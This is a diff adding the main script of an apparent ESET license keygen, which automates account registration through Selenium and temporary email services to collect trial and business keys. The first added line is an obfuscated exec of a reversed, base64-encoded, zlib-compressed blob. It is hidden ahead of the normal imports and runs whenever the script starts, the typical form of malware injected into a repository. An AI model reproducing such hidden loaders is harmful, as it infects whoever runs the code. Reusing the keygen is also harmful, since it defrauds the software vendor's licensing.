@@ -1,1 +1,427 @@
-import zlib,base64;exec(zlib.decompress(base64.b64decode(b'=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'[::-1])[::-1]))
+from modules.WebDriverInstaller import *
+from modules.EsetTools import *
+from modules.SharedTools import *
+from modules.EmailAPIs import *
+from modules.Updater import get_assets_from_version, parse_update_json, updater_main
+
+import traceback
+import colorama
+import platform
+import datetime
+import argparse
+import time
+import sys
+import os
+import re
+
+VERSION = ['v1.4.9.2', 1492]
+LOGO = f"""
+███████╗███████╗███████╗████████╗   ██╗  ██╗███████╗██╗   ██╗ ██████╗ ███████╗███╗   ██╗
+██╔════╝██╔════╝██╔════╝╚══██╔══╝   ██║ ██╔╝██╔════╝╚██╗ ██╔╝██╔════╝ ██╔════╝████╗  ██║
+█████╗  ███████╗█████╗     ██║      █████╔╝ █████╗   ╚████╔╝ ██║  ███╗█████╗  ██╔██╗ ██║
+██╔══╝  ╚════██║██╔══╝     ██║      ██╔═██╗ ██╔══╝    ╚██╔╝  ██║   ██║██╔══╝  ██║╚██╗██║   
+███████╗███████║███████╗   ██║      ██║  ██╗███████╗   ██║   ╚██████╔╝███████╗██║ ╚████║   
+╚══════╝╚══════╝╚══════╝   ╚═╝      ╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═══╝                                                                      
+                                                Project Version: {VERSION[0]}
+                                                Project Devs: rzc0d3r, AdityaGarg8, k0re,
+                                                              Fasjeit, alejanpa17, Ischunddu,
+                                                              soladify, AngryBonk, Xoncia
+"""
+
+# -- Quick settings [for Developers to quickly change behavior without changing all files] --
+DEFAULT_EMAIL_API = 'developermail'
+AVAILABLE_EMAIL_APIS = ['1secmail', 'hi2in', '10minutemail', 'tempmail', 'guerrillamail', 'developermail']
+WEB_WRAPPER_EMAIL_APIS = ['10minutemail', 'hi2in', 'tempmail', 'guerrillamail']
+EMAIL_API_CLASSES = {
+    'guerrillamail': GuerRillaMailAPI,
+    '10minutemail': TenMinuteMailAPI,
+    'hi2in': Hi2inAPI,                  
+    'tempmail': TempMailAPI,
+    '1secmail': OneSecEmailAPI,
+    'developermail': DeveloperMailAPI,
+}
+
+
+args = {
+    'chrome': True,
+    'firefox': False,
+    'edge': False,
+
+    'key': True,
+    'account': False,
+    'business_key': False,
+    'business_account': False,
+    'only_webdriver_update': False,
+    'update': False,
+
+    'skip_webdriver_menu': False,
+    'no_headless': False,
+    'custom_browser_location': '',
+    'email_api': DEFAULT_EMAIL_API,
+    'custom_email_api': False,
+    'skip_update_check': False,
+}
+
+MENU_EXECUTION = True
+
+class MenuAction(object):
+    def __init__(self, title, func):
+        self.title = title
+        self.function = func
+
+    def render_title(self):
+        return self.title
+    
+    def run(self):
+        if isinstance(self.function, ViewMenu):
+            self.function.view()
+        else:
+            self.function()
+
+class OptionAction(object):
+    def __init__(self, title, action, args_names, choices=[], default_value=None):
+        self.title = title
+        self.action = action
+        self.value = default_value
+        self.choices = choices
+        self.args_names = args_names
+        
+    def render_title(self):
+        if self.action in ['store_true', 'choice']:
+            return f'{self.title} (selected: {colorama.Fore.YELLOW}{self.value}{colorama.Fore.RESET})'
+        elif self.action == 'manual_input':
+            return f'{self.title} (saved: {colorama.Fore.YELLOW}{self.value}{colorama.Fore.RESET})'
+        elif self.action == 'bool_switch':
+            if args[self.args_names.replace('-', '_')]:
+                return f'{self.title} {colorama.Fore.GREEN}(enabled){colorama.Fore.RESET}'
+            return f'{self.title} {colorama.Fore.RED}(disabled){colorama.Fore.RESET}'
+        
+    def run(self):
+        if self.action == 'bool_switch':
+            args[self.args_names.replace('-', '_')] = not args[self.args_names.replace('-', '_')]
+            return True
+        while MENU_EXECUTION:
+            clear_console()
+            print(self.title+'\n')
+            menu_items = []
+            if self.choices != []:
+                menu_items = self.choices
+            else:
+                menu_items = self.args_names
+            if self.action != 'manual_input':
+                for index in range(0, len(menu_items)):
+                    menu_item = menu_items[index]
+                    print(f'{index+1} - {menu_item}')
+                print()
+            try:
+                if self.action == 'manual_input':
+                    self.value = input('>>> ').strip()
+                    args[self.args_names.replace('-', '_')] = self.value # self.args_names is str
+                    break
+                index = int(input('>>> ').strip()) - 1
+                self.value = menu_items[index]
+                if index in range(0, len(menu_items)):
+                    if self.action == 'store_true':
+                        for args_name in self.args_names: # self.args_names is list
+                            args[args_name.replace('-', '_')] = False
+                        args[self.value.replace('-', '_')] = True # self.value == args_name
+                    elif self.action == 'choice':
+                        args[self.args_names.replace('-', '_')] = self.value # self.args_names is str
+                    break
+            except ValueError:
+                pass
+
+class ViewMenu(object):
+    def __init__(self, title):
+        self.title = title
+        self.items = []
+
+    def add_item(self, menu_action_object: MenuAction):
+        self.items.append(menu_action_object)
+    
+    def view(self):
+        while MENU_EXECUTION:
+            clear_console()
+            print(self.title+'\n')
+            for item_index in range(0, len(self.items)):
+                item = self.items[item_index]
+                print(f'{item_index+1} - {item.render_title()}')
+            print()
+            try:
+                selected_item_index = int(input('>>> ')) - 1
+                if selected_item_index in range(0, len(self.items)):
+                    print(self.items[selected_item_index].run())
+            except ValueError:
+                pass
+
+def RunMenu():
+    MainMenu = ViewMenu(LOGO+'\n---- Main Menu ----')
+
+    SettingMenu = ViewMenu(LOGO+'\n---- Settings Menu ----')
+    SettingMenu.add_item(
+        OptionAction(
+            title='Browsers',
+            action='store_true',
+            args_names=['chrome', 'firefox', 'edge'],
+            default_value='chrome'
+        )
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='Modes of operation',
+            action='store_true',
+            args_names=['key', 'account', 'business-account', 'business-key', 'only-webdriver-update', 'update'],
+            default_value='key')
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='Email APIs',
+            action='choice',
+            args_names='email-api',
+            choices=AVAILABLE_EMAIL_APIS,
+            default_value=DEFAULT_EMAIL_API
+        )
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='--skip-webdriver-menu',
+            action='bool_switch',
+            args_names='skip-webdriver-menu'
+        )
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='--no-headless',
+            action='bool_switch',
+            args_names='no-headless'
+        )
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='--custom-browser-location',
+            action='manual_input',
+            args_names='custom-browser-location',
+            default_value=''
+        )
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='--custom-email-api',
+            action='bool_switch',
+            args_names='custom-email-api'
+        )
+    )
+    SettingMenu.add_item(
+        OptionAction(
+            title='--skip-update-check',
+            action='bool_switch',
+            args_names='skip_update_check'
+        )
+    )
+    SettingMenu.add_item(MenuAction('Back', MainMenu))
+    MainMenu.add_item(MenuAction('Settings', SettingMenu))
+    MainMenu.add_item(MenuAction(f'{colorama.Fore.LIGHTWHITE_EX}Do it, damn it!{colorama.Fore.RESET}', main))
+    MainMenu.add_item(MenuAction('Exit', sys.exit))
+    MainMenu.view()
+
+def parse_argv():
+    print(LOGO)
+    if len(sys.argv) == 1: # Menu
+        #global MENU_EXECUTION
+        #MENU_EXECUTION = True
+        RunMenu()
+    else: # CLI
+        args_parser = argparse.ArgumentParser()
+        # Required
+        ## Browsers
+        args_browsers = args_parser.add_mutually_exclusive_group(required=('--update' not in sys.argv))
+        args_browsers.add_argument('--chrome', action='store_true', help='Launching the project via Google Chrome browser')
+        args_browsers.add_argument('--firefox', action='store_true', help='Launching the project via Mozilla Firefox browser')
+        args_browsers.add_argument('--edge', action='store_true', help='Launching the project via Microsoft Edge browser')
+        ## Modes of operation
+        args_modes = args_parser.add_mutually_exclusive_group(required=True)
+        args_modes.add_argument('--key', action='store_true', help='Generating an ESET-HOME license key (example as AGNV-XA2V-EA89-U546-UVJP)')
+        args_modes.add_argument('--account', action='store_true', help='Generating an ESET HOME Account (To activate the free trial version)')
+        args_modes.add_argument('--business-account', action='store_true', help='Generating an ESET BUSINESS Account (To huge businesses) - Requires manual captcha input!!!')
+        args_modes.add_argument('--business-key', action='store_true', help='Generating an ESET BUSINESS Account and creating a universal license key for ESET products (1 key - 75 devices) - Requires manual captcha input!!!')
+        args_modes.add_argument('--only-webdriver-update', action='store_true', help='Updates/installs webdrivers and browsers without generating account and license key')
+        args_modes.add_argument('--update', action='store_true', help='Switching to program update mode - Overrides all arguments that are available!!!')
+        # Optional
+        args_parser.add_argument('--skip-webdriver-menu', action='store_true', help='Skips installation/upgrade webdrivers through the my custom wrapper (The built-in selenium-manager will be used)')
+        args_parser.add_argument('--no-headless', action='store_true', help='Shows the browser at runtime (The browser is hidden by default, but on Windows 7 this option is enabled by itself)')
+        args_parser.add_argument('--custom-browser-location', type=str, default='', help='Set path to the custom browser (to the binary file, useful when using non-standard releases, for example, Firefox Developer Edition)')
+        args_parser.add_argument('--email-api', choices=AVAILABLE_EMAIL_APIS, default=DEFAULT_EMAIL_API, help='Specify which api to use for mail')
+        args_parser.add_argument('--custom-email-api', action='store_true', help='Allows you to manually specify any email, and all work will go through it. But you will also have to manually read inbox and do what is described in the documentation for this argument')
+        args_parser.add_argument('--skip-update-check', action='store_true', help='Skips checking for program updates')
+        #args_parser.add_argument('--try-auto-cloudflare',action='store_true', help='Removes the prompt for the user to press Enter when solving cloudflare captcha. In some cases it may go through automatically, which will give the opportunity to use tempmail in automatic mode!')
+        try:
+            global args
+            args = vars(args_parser.parse_args())
+        except:
+            time.sleep(3)
+            sys.exit(-1)
+
+def main():
+    if len(sys.argv) == 1: # for Menu
+        print()
+    try:
+        # check program updates
+        if args['update']:
+            print('-- Updater --\n')
+            updater_main(from_main=True) # from_main - changes the behavior in Updater so that everything works correctly from under main.py
+            if len(sys.argv) == 1:
+                input('\nPress Enter to exit...')
+            else:
+                time.sleep(3) # exit-delay
+            sys.exit(0)
+        if not args['skip_update_check'] and not args['update']:
+            print('-- Updater --\n')
+            try:
+                latest_cloud_version = get_assets_from_version(parse_update_json(from_main=True), 'latest')['version']
+                latest_cloud_version_int = latest_cloud_version[1:].split('.')
+                latest_cloud_version_int = int(''.join(latest_cloud_version_int[:-1])+latest_cloud_version_int[-1][0])
+                if VERSION[1] > latest_cloud_version_int:
+                    console_log(f'The project has an unreleased version, maybe you are using a build from the developer?\n', WARN)
+                elif latest_cloud_version_int > VERSION[1]:
+                    console_log(f'Project update is available up to version: {colorama.Fore.GREEN}{latest_cloud_version}{colorama.Fore.RESET}', WARN)
+                    console_log('If you want to download the update run this file with --update argument\n', WARN)
+                else:
+                    console_log('Project up to date!!!\n', OK)
+            except:
+                pass
+        # initialization and configuration of everything necessary for work
+        webdriver_installer = WebDriverInstaller()
+        # changing input arguments for special cases
+        if platform.release() == '7' and sys.platform.startswith('win'): # fix for Windows 7
+            args['no_headless'] = True
+        elif args['business_account'] or args['business_key'] or args['email_api'] in ['tempmail']:
+            args['no_headless'] = True
+        driver = None
+        webdriver_path = None
+        browser_name = 'chrome'
+        if args['firefox']:
+            browser_name = 'firefox'
+        if args['edge']:
+            browser_name = 'edge'
+        if not args['skip_webdriver_menu']: # updating or installing webdriver
+            webdriver_path = webdriver_installer.webdriver_installer_menu(args['edge'], args['firefox'])
+            if webdriver_path is not None:
+                os.chmod(webdriver_path, 0o777)
+        if not args['only_webdriver_update']:
+            driver = initSeleniumWebDriver(browser_name, webdriver_path, args['custom_browser_location'], (not args['no_headless']))
+            if driver is None:
+                raise RuntimeError(f'Initialization {browser_name}-webdriver error!')
+        else:
+            sys.exit(0)
+
+        # main part of the programd
+        if not args['custom_email_api']:  
+            console_log(f'\n[{args["email_api"]}] Mail registration...', INFO)
+            if args['email_api'] in WEB_WRAPPER_EMAIL_APIS: # WebWrapper API, need to pass the selenium object to the class initialization
+                email_obj = EMAIL_API_CLASSES[args['email_api']](driver)
+            else: # real APIs without the need for a browser
+                email_obj = EMAIL_API_CLASSES[args['email_api']]()
+            email_obj.init()
+            console_log('Mail registration completed successfully!', OK)
+        else:
+            email_obj = CustomEmailAPI()
+            while True:
+                email = input(f'\n[  {colorama.Fore.YELLOW}INPT{colorama.Fore.RESET}  ] {colorama.Fore.CYAN}Enter the email address you have access to: {colorama.Fore.RESET}').strip()
+                try:
+                    matched_email = re.match(r"[-a-z0-9+]+@[a-z]+\.[a-z]{2,3}", email).group()
+                    if matched_email == email:
+                        email_obj.email = matched_email
+                        console_log('Mail has the correct syntax!', OK)
+                        break
+                    else:
+                        raise RuntimeError
+                except:
+                    console_log('Invalid email syntax!!!', ERROR)
+        eset_password = dataGenerator(10)
+        
+        # standart generator
+        if args['account'] or args['key']:
+            EsetReg = EsetRegister(email_obj, eset_password, driver)
+            EsetReg.createAccount()
+            EsetReg.confirmAccount()
+            output_line = '\n'.join([
+                    '',
+                    '----------------------------------',
+                    f'Account Email: {email_obj.email}',
+                    f'Account Password: {eset_password}',
+                    '----------------------------------',
+                    ''
+            ])        
+            output_filename = 'ESET ACCOUNTS.txt'
+            if args['key']:
+                output_filename = 'ESET KEYS.txt'
+                EsetKeyG = EsetKeygen(email_obj, driver)
+                EsetKeyG.sendRequestForKey()
+                license_name, license_key, license_out_date = EsetKeyG.getLicenseData()
+                output_line = '\n'.join([
+                    '',
+                    '----------------------------------',
+                    f'Account Email: {email_obj.email}',
+                    f'Account Password: {eset_password}',
+                    '',
+                    f'License Name: {license_name}',
+                    f'License Key: {license_key}',
+                    f'License Out Date: {license_out_date}',
+                    '----------------------------------',
+                    ''
+                ])
+                
+        # new generator
+        elif args['business_account'] or args['business_key']:
+            EsetBusinessReg = EsetBusinessRegister(email_obj, eset_password, driver)
+            EsetBusinessReg.createAccount()
+            EsetBusinessReg.confirmAccount()
+            output_line = '\n'.join([
+                    '',
+                    '----------------------------------',
+                    f'Business Account Email: {email_obj.email}',
+                    f'Business Account Password: {eset_password}',
+                    '----------------------------------',
+                    ''
+            ])    
+            output_filename = 'ESET ACCOUNTS.txt'
+            if args['business_key']:
+                output_filename = 'ESET KEYS.txt'
+                EsetBusinessKeyG = EsetBusinessKeygen(email_obj, eset_password, driver)
+                EsetBusinessKeyG.sendRequestForKey()
+                license_name, license_key, license_out_date = EsetBusinessKeyG.getLicenseData()
+                output_line = '\n'.join([
+                    '',
+                    '----------------------------------',
+                    f'Business Account Email: {email_obj.email}',
+                    f'Business Account Password: {eset_password}',
+                    '',
+                    f'License Name: {license_name}',
+                    f'License Key: {license_key}',
+                    f'License Out Date: {license_out_date}',
+                    '----------------------------------',
+                    ''
+                ])        
+        # end
+        console_log(output_line)
+        date = datetime.datetime.now()
+        f = open(f"{str(date.day)}.{str(date.month)}.{str(date.year)} - "+output_filename, 'a')
+        f.write(output_line)
+        f.close()
+        driver.quit()
+    
+    except Exception as E:
+        traceback_string = traceback.format_exc()
+        if str(type(E)).find('selenium') and traceback_string.find('Stacktrace:') != -1: # disabling stacktrace output
+            traceback_string = traceback_string.split('Stacktrace:', 1)[0]
+        console_log(traceback_string, ERROR)
+    if len(sys.argv) == 1:
+        input('Press Enter to exit...')
+    else:
+        time.sleep(3) # exit-delay
+    sys.exit()
+
+if __name__ == '__main__':
+    parse_argv() # if Menu, the main function will be called in automatic mode
+    if len(sys.argv) > 1: # CLI
+        main()
